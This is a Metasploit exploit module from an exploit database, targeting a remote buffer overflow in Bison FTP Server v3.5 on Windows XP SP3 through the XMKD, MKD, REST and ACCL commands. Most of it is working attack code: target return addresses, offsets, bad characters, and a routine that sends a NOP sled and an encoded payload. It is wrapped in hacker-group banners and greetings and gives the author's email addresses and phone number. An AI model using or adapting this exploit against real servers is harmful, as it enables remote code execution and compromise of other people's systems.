1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : 1337day.com                                   0
1  [+] Support e-mail  : submit[at]1337day.com                         1
0                                                                      0
1               #########################################              1
0               I'm KedAns-Dz member from Inj3ct0r Team                1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

###
# Title : Bison FTP Server v3.5 Multiple Remote Root BOF Exploit (MSF)
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com (ked-h@1337day.com) | ked-h@exploit-id.com | kedans@facebook.com
# Home : Hassi.Messaoud (30008) - Algeria -(00213555248701)
# Web Site : www.1337day.com * www.exploit-id.com * sec4ever.com
# Facebook : http://facebook.com/KedAns
# platform : windows
# Impact : Remote Root & Buffer Overflow (Multiple Command's via MSF)
# Tested on : Windows XP SP3 (en)
##

##
# | >> --------+++=[ Dz Offenders Cr3w ]=+++-------- << |
# | > Indoushka * KedAns-Dz * Caddy-Dz * Kalashinkov3   |
# | Jago-dz * Over-X * Kha&miX * Ev!LsCr!pT_Dz * Dr.55h |
# | * ------>  KinG Of PiraTeS * The g0bl!n <-------- * | 
# | ------------------------------------------------- < |
###

##
# $Id: bisonftp_bof.rb | 2011-09-03 | 15:30 | KedAns-Dz $
##

require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking
 
  include Msf::Exploit::Remote::Ftp
 
  def initialize(info = {})
    super(update_info(info,
    'Name' => 'Bison FTP Server v3.5 Multiple Remote Root BOF Exploit',
    'Description' => %q{
    This module exploits a Bison FTP Server v3.5 Remote Buffer Overflow
    and Crashed the Server ,found in the XMKD/MKD/REST/ACCL command's.
    },
    'Author' => [
     'KedAns-Dz <ked-h[at]hotmail.com>', 
    ],
    'License' => MSF_LICENSE,
    'Version' => '$Revision: 0.1',
    'References' =>
      [
       [ 'URL', 'http://1337day.com/exploits/16817' ], # by KedAns-Dz
       [ 'URL', 'http://1337day.com/exploits/16650' ], # by localh0t
      ],
    'DefaultOptions' =>
      {
       'EXITFUNC' => 'process',
      },
    'Payload' =>
      {
       'BadChars' => "\x00\x0a\x0d",
      },
    'Platform' => 'win',
    'Targets' =>
      [
       [ 'Bison FTP Server (Windows XP-SP3 / XMKD command)',
        {
        'Ret' => 0x7cb97475, # jmp esp - (shell32.dll)
        'Offset' => 1337,
        'CMD' => 'XMKD'
        }
       ],
       [ 'Bison FTP Server (Windows XP-SP3 / REST command)',
        {
        'Ret' => 0x7cb97475, # jmp esp - (shell32.dll)
        'Offset' => 1337,
         'CMD' => 'REST'
        }
       ],
       [ 'Bison FTP Server (Windows XP-SP3 / MKD command)',
        {
        'Ret' => 0x7cb97475, # jmp esp - (shell32.dll)
        'Offset' => 1337,
        'CMD' => 'MKD'
        }
       ],
       [ 'Bison FTP Server (Windows XP-SP3 / ACCL command)',
        {
        'Ret' => 0x7cb97475, # jmp esp - (shell32.dll)
        'Offset' => 1337,
        'CMD' => 'ACCL'
        }
       ],
       ],
    'DefaultTarget' => 0))
    end
	
	def check
       connect
       disconnect

        if (banner =~ /BisonWare BisonFTP server product V3.5/)
        return Exploit::CheckCode::Vulnerable
        end
        return Exploit::CheckCode::Safe
	end
 
    def exploit
       connect_login
 
       print_status("Trying target #{target.name}...")
 
        buf = make_nops(target['Offset']) # Nop's for Crashing 
        buf << payload.encoded
        buf << make_nops(8) # Padding
        buf << [target.ret].pack('V')
        buf << "\x0a" # End Connection
 
        send_cmd( [target['CMD'], buf] , false )
 
       handler
       disconnect
    end
	
end

#================[ Exploited By KedAns-Dz * Inj3ct0r Team * ]=====================================
# Greets To : Dz Offenders Cr3w < Algerians HaCkerS > + Rizky Ariestiyansyah * Islam Caddy <3
# + Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re * CrosS (www.1337day.com) 
# Inj3ct0r Members 31337 : Indoushka * KnocKout * eXeSoul * SeeMe * XroGuE * ZoRLu * gunslinger_ 
# anT!-Tr0J4n * ^Xecuti0N3r * Kalashinkov3 (www.1337day.com/team) * Dz Offenders Cr3w * Sec4ever
# Exploit-ID Team : jos_ali_joe + Caddy-Dz + kaMtiEz + r3m1ck (exploit-id.com) * Jago-dz * Over-X
# Kha&miX * Str0ke * JF * Ev!LsCr!pT_Dz * KinG Of PiraTeS * www.packetstormsecurity.org * TreX
# www.metasploit.com * UE-Team & I-BackTrack * r00tw0rm.com * All Security and Exploits Webs ..
#=================================================================================================